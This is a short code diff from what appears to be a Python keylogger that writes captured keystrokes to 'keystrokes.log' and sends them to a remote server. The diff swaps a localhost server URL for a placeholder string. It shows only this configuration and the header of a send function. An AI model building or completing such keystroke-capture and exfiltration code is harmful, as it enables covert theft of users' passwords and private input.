@@ -7,7 +7,7 @@ from datetime import datetime
 logging.basicConfig(filename="keystrokes.log", level=logging.INFO, format="%(asctime)s - %(message)s")
 
 # Server URL where data will be sent
-SERVER_URL = "http://127.0.0.1:5000/logs"  # Replace with your server's actual URL
+SERVER_URL = "Enter your actual server url"  # Replace with your server's actual URL
 
 # Function to send data to the server
 def send_data_to_server(data):
